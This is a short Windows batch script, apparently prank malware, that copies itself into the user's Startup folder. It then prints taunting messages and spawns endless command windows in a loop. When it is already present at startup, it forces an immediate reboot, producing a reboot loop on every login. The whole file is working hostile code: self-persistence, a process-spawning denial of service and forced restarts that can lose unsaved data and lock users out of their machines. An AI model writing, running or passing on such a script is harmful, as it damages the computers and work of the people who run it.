@echo off

cls
if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Start Menu\Programs\Startup\comprmzr.bat" goto skipcopy
copy "comprmzr.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Start Menu\Programs\Startup\comprmzr.bat"
echo your computer is toast now!
echo say goodbye before it's too late lol
echo infected by echo
pause
goto spam
shutdown /r /f /t 15
exit

:skipcopy
shutdown /r /f /t 0
goto spam

:spam
start
goto spam
